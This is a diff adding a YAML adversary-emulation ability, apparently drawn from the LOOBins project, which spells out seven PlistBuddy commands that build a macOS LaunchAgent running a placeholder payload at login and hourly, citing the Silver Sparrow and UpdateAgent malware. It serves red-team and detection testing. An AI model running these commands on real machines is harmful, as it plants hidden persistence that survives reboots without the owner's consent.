@@ -1,0 +1,43 @@
+- id: c2c7db96-1068-97c3-8820-3e30b4735941
+  name: PlistBuddy - Build a LaunchAgent or LaunchDaemon key by key for persistence
+  description: PlistBuddy creates the target file when it is missing, so a series of Add commands assembles
+    a launchd job in place. Nothing is copied from a disk image or archive, so the plist carries no com.apple.quarantine
+    attribute. Red Canary saw this in Silver Sparrow's installer and Microsoft reported UpdateAgent doing
+    the same. Writing to ~/Library/LaunchAgents needs only the current user; the /Library paths require
+    root.
+  tactic: persistence
+  technique:
+    attack_id: T1543.001
+    name: 'Create or Modify System Process: Launch Agent'
+  platforms:
+    darwin:
+      sh:
+        command: '/usr/libexec/PlistBuddy -c "Add :Label string <LABEL>" ~/Library/LaunchAgents/<LABEL>.plist
+
+          /usr/libexec/PlistBuddy -c "Add :RunAtLoad bool true" ~/Library/LaunchAgents/<LABEL>.plist
+
+          /usr/libexec/PlistBuddy -c "Add :StartInterval integer 3600" ~/Library/LaunchAgents/<LABEL>.plist
+
+          /usr/libexec/PlistBuddy -c "Add :ProgramArguments array" ~/Library/LaunchAgents/<LABEL>.plist
+
+          /usr/libexec/PlistBuddy -c "Add :ProgramArguments:0 string /bin/sh" ~/Library/LaunchAgents/<LABEL>.plist
+
+          /usr/libexec/PlistBuddy -c "Add :ProgramArguments:1 string -c" ~/Library/LaunchAgents/<LABEL>.plist
+
+          /usr/libexec/PlistBuddy -c "Add :ProgramArguments:2 string <PAYLOAD_PATH>" ~/Library/LaunchAgents/<LABEL>.plist'
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  delete_payload: false
+  buckets:
+  - loobins
+  - plistbuddy
+  - persistence
+  version: '1.0'
+  author: LOOBins Project
+  additional_info:
+    loobins_tool: PlistBuddy
+    use_case: Build a LaunchAgent or LaunchDaemon key by key for persistence
+    source_file: PlistBuddy.yml
+    source_repository: https://github.com/infosecB/LOOBins
+    import_timestamp: '2026-10-12T08:33:56.294236Z'
